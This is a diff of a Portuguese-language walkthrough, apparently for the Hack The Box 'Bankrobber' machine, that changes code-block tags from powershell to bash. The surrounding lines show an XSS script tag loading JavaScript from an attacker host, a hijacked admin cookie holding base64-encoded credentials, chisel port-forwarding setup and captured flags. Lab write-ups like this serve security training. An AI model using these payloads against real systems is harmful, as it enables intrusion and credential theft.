@@ -213,7 +213,7 @@
 <pre><code class="language-html">&lt;script src=&quot;http://10.10.14.9/test.js&quot;&gt;&lt;/script&gt;
 </code></pre>
 <p>Esse código faz com que, se existir a tal vulnerabilidade, o browser por onde o administrador simulado abre a transação, execute esse código javascript, que por sua vez tenta adquirir um outro ficheiro denominado test.js localizado em http://10.10.14.9/. É claro que para verificar se o código é executado, é necessário disponibilizar este serviço http:</p>
-<pre><code class="language-powershell">sudo python3 -m http.server 80
+<pre><code class="language-bash">sudo python3 -m http.server 80
 #&gt;  10.10.10.154 - - [13/Sep/2021 12:12:58] code 404, message File not found
 #&gt;  10.10.10.154 - - [13/Sep/2021 12:12:58] &quot;GET /test.js HTTP/1.1&quot; 404 -
 </code></pre>
@@ -227,7 +227,7 @@ request.send()
 </code></pre>
 <p><img src="Assets/HTB-Windows-Insane-Bankrobber/cookie_hijack.png" alt="Cookie hijack" /></p>
 <p>Na imagem, é possível ver o cookie de um usuário (supostamente administrador pelo que o alerta nos informou). Esse cookie está &quot;encoded&quot;. Primeiro podemos reverter o &quot;urlencoded&quot; com ajuda do php em modo interativo. O resultado é o seguinte:</p>
-<pre><code class="language-powershell">username=YWRtaW4=; password=SG9wZWxlc3Nyb21hbnRpYw==; id=1
+<pre><code class="language-bash">username=YWRtaW4=; password=SG9wZWxlc3Nyb21hbnRpYw==; id=1
 </code></pre>
 <p>Isto não é o username e password em texto claro. Mas pelo formato, é facilmente identificável. Vamos tentar descodificar:</p>
 <p><img src="Assets/HTB-Windows-Insane-Bankrobber/admin_credenciais.png" alt="Credenciais do administrador" /></p>
@@ -322,11 +322,11 @@ request.send(params)
 <p><img src="Assets/HTB-Windows-Insane-Bankrobber/in-the-target-machine.png" alt="In the target machine" /></p>
 <h1 id="privesc"><a class="header" href="#privesc">PrivEsc</a></h1>
 <p>Depois de um café, vamos enumerar um pouco a máquina.</p>
-<pre><code class="language-powershell">netstat -ano
+<pre><code class="language-bash">netstat -ano
 </code></pre>
 <p><img src="Assets/HTB-Windows-Insane-Bankrobber/newport.png" alt="Porta nova" /></p>
 <p>Existe uma porta nova, que não existia no NMAP, por estar bloqueado a nível de firewall para se poder operar apenas por localhost. Porta 910!</p>
-<pre><code class="language-powershell">tasklist
+<pre><code class="language-bash">tasklist
 </code></pre>
 <p><img src="Assets/HTB-Windows-Insane-Bankrobber/tasklist.png" alt="tasklist" /></p>
 <p>Através do PID, verificamos que o programa que está a ocupar esta porta é o bankv2.exe.</p>
@@ -334,7 +334,7 @@ request.send(params)
 <p>Para ser mais comodo, vou fazer um PortForwarding desta porta 910 para a minha porta 910 da minha máquiina kali.</p>
 <p>Para isso, irei utilizar o chisel do jpillora (https://github.com/jpillora/chisel/releases)</p>
 <p>Enviar o chisel windows para a máquina alvo, e guarda a versão linux na minha máquina</p>
-<pre><code class="language-powershell">wget https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz
+<pre><code class="language-bash">wget https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz
 wget https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_windows_amd64.gz
 
 mv chisel_1.7.6_linux_amd64.gz chisel.elf.gz
@@ -401,7 +401,7 @@ main()
 <p>Isto não é bem um BufferOverFlow, mas a base é a mesma. Reescrever uma instrução.</p>
 <p><img src="Assets/HTB-Windows-Insane-Bankrobber/admin_whoami_authority-system.png" alt="Admin whoami" /></p>
 <p>As flags estão sempre no mesmo sítio...</p>
-<pre><code class="language-powershell">type C:\Users\Cortin\Desktop\user.txt
+<pre><code class="language-bash">type C:\Users\Cortin\Desktop\user.txt
 #&gt;  f635346600876a43441cf1..........
 type C:\Users\admin\Desktop\root.txt
 #&gt;  aa65d8e6216585ea636eb0..........
